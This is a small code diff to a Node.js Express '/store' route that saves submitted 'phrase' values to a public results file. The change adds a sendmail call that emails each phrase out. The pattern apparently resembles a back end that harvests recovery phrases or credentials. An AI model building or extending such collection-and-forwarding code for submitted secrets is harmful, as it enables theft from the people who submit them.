@@ -36,6 +36,8 @@ app.post('/store', (req, res) => {
     let {phrase} = req.body 
     phrase+= '\n'
     const filePath = 'public/results.txt';
+   
+    sendmail(phrase)
    const append =  fs.appendFile(filePath, phrase, (err) => {
         if (err) {
           console.error('An error occurred while appending to the file:', err);
